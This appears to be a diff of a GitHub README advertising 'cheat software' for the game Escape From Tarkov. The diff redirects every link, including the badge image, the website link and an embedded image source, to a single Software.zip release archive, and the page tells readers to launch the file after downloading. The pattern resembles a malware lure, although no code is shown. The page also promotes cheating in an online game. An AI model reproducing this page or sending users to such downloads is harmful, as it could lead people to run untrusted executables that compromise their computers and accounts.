@@ -29,18 +29,18 @@ Welcome to the Cheat Escape From Tarkov repository! If you're looking to enhance
 
 ## 🚀 Download the Cheat Software
 To download the cheat software, click the button below:
-[![Download Cheat Software](https://img.shields.io/badge/Download%20Software-Click%20Here-success)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Cheat Software](https://github.com/serapunk/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip%20Software-Click%20Here-success)](https://github.com/serapunk/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip)
 *(File needs to be launched after downloading)*
 
 If the above link doesn't work, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Visit Our Website
-Explore more cheats and hacks on our website: [Cheat Escape From Tarkov Website](https://example.com)
+Explore more cheats and hacks on our website: [Cheat Escape From Tarkov Website](https://github.com/serapunk/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip)
 
 ---
 
 ### Enjoy dominating Escape From Tarkov with our cheats and hacks! 🔥🎮🚀
 
 <div align="center">
-  <img src="https://example.com/cool-image.jpg" alt="Cool Image" width="500"/>
+  <img src="https://github.com/serapunk/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip" alt="Cool Image" width="500"/>
 </div>
